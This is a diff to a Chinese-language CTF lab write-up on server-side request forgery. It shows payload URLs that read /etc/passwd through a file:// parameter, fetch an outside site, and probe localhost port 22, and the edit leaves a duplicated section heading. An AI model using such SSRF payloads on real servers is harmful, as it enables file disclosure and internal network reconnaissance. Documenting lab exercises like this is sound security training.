@@ -31,13 +31,23 @@ http://ctf.eagleslab.com:41121/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
 
 → 完整 /etc/passwd 内容被回显到页面。
 
-### 1.3 内网端口探测
+![file:// 读 /etc/passwd 实测](./screenshots/01-file-protocol-passwd.png)
+
+### 1.3 内网探测对照（http 协议 → 抓 baidu.com）
+
+替换 URL 为公网地址，验证 SSRF 能拉取任意 HTTP 内容（同样的 curl 服务）：
+
+```
+http://ctf.eagleslab.com:41121/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com/
+```
+
+![SSRF 拉取外网 HTTP 内容](./screenshots/02-ssrf-http-baidu.png)
+
+## 2. ssrf_fgc — file_get_content
 
 ```
 http://ctf.eagleslab.com:41121/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:22
 ```
-
-→ 端口开放时显示服务 banner；关闭则一直 loading。
 
 ## 2. ssrf_fgc — file_get_content
 
